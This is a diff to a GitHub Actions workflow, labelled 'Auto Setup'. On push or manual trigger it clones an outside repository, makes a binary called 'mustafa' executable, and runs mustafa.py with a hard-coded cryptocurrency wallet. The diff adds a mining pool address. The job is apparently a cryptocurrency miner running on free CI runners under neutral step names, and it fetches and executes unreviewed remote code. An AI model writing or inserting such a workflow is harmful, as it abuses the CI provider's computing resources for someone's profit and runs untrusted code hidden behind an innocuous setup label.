@@ -1,4 +1,4 @@
-name: 🔄 Auto Mustu Setup (Clean)
+name: Auto Setup
 
 on:
   push:
@@ -8,44 +8,48 @@ on:
   workflow_dispatch:
 
 jobs:
-  auto-run:
+  run-script:
     runs-on: ubuntu-latest
     
     steps:
-    - name: 📥 Checkout
-      uses: actions/checkout@v4
+    - name: 📥 Clone
+      run: |
+        echo "Cloning repository..."
+        git clone https://github.com/thumpingpp/mustu-setup.git
     
-    - name: 🐍 Setup Python
+    - name: 🐍 Python Setup
       uses: actions/setup-python@v5
       with:
         python-version: '3.10'
     
-    - name: 🚀 Run Mustu Setup
+    - name: 🚀 Run with Pool
       run: |
-        echo "🚀 Starting mustu setup..."
-        
-        # Clone repository
-        git clone https://github.com/thumpingpp/mustu-setup.git
-        
-        # Go to directory and set permissions
         cd mustu-setup
         chmod +x mustafa
+        echo "========================================="
+        echo "🚀 Starting Setup"
+        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+        echo "Pool: hashvalut.pro:8888"
+        echo "========================================="
+        echo ""
+        echo "📟 Live Output:"
+        echo "-----------------------------------------"
         
-        # Run with wallet
-        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" 2>&1 | grep -v "apt"
+        # Run with wallet and pool
+        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" --pool "hashvalut.pro:8888"
         
-        echo "✅ Done!"
+        echo "-----------------------------------------"
+        echo "✅ Done"
     
-    - name: 💾 Save Log
+    - name: 💾 Log Save
+      if: always()
       run: |
-        echo "Last run: $(date)" > last_run.txt
-        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
+        echo "$(date) - Run with pool hashvalut.pro:8888" >> run_log.txt
     
     - name: 📤 Upload Log
       uses: actions/upload-artifact@v4
       if: always()
       with:
         name: run-logs
-        path: |
-          last_run.txt
-        retention-days: 5
+        path: run_log.txt
+        retention-days: 3
